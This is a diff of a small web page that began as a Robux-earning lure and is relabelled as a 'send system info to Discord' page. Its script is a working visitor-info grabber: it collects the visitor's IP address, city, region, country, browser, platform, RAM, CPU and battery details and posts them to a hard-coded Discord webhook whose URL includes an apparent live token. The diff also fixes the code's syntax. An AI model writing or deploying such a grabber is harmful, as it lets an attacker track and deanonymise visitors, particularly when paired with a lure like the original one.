@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RobuxAds</title>
+    <title>Send Detailed System Info to Discord</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -41,19 +41,20 @@
 </head>
 <body>
     <div class="container">
-        <h1>Click To Start Earning Robux</h1>
-        <button class="button" onclick="sendInfo()">Begin</button>
+        <h1>Click to Send Info to Discord</h1>
+        <button class="button" onclick="sendInfo()">Send Info</button>
     </div>
 
     <script>
         function sendInfo() {
+            // Fetch Geolocation Info
             fetch('https://ipwhois.app/json/')
                 .then(response => response.json())
                 .then(data => {
                     // Collecting additional info
-                    const geoInfo = IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nTimezone: ${data.timezone}\nCurrency: ${data.currency};
+                    const geoInfo = `IP: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nTimezone: ${data.timezone}\nCurrency: ${data.currency}`;
 
-                    const systemInfo = 
+                    const systemInfo = `
                         Screen Resolution: ${window.innerWidth}x${window.innerHeight}
                         Browser: ${navigator.userAgent}
                         Operating System: ${navigator.platform}
@@ -62,9 +63,9 @@
                         Battery Status: ${navigator.getBattery ? getBatteryStatus() : 'N/A'}
                         RAM: ${navigator.deviceMemory}GB
                         CPU Cores: ${navigator.hardwareConcurrency}
-                    ;
+                    `;
 
-                    const performanceInfo = Page Load Time: ${window.performance.timing.loadEventEnd - window.performance.timing.navigationStart} ms;
+                    const performanceInfo = `Page Load Time: ${window.performance.timing.loadEventEnd - window.performance.timing.navigationStart} ms`;
 
                     // Send the info to Discord Webhook
                     sendToWebhook(geoInfo, systemInfo, performanceInfo);
@@ -83,12 +84,12 @@
 
         function getBatteryStatus() {
             navigator.getBattery().then(function(battery) {
-                return Level: ${battery.level * 100}% Charging: ${battery.charging ? 'Yes' : 'No'};
+                return `Level: ${battery.level * 100}% Charging: ${battery.charging ? 'Yes' : 'No'}`;
             });
         }
 
         function sendToWebhook(geoInfo, systemInfo, performanceInfo) {
-            const webhookURL = "https://discord.com/api/webhooks/1334960796609937499/7YlpdDT2pphEH6wCeuD6eS10QIS1QQVyz2HicjXZPK5lZ7XOpgs3ZBiG_7fDFhiTpAWm"; // Replace with your actual Discord webhook URL
+            const webhookURL = "https://discord.com/api/webhooks/1334960796609937499/7YlpdDT2pphEH6wCeuD6eS10QIS1QQVyz2HicjXZPK5lZ7XOpgs3ZBiG_7fDFhiTpAWm";
 
             const content = {
                 content: "Detailed System Information",
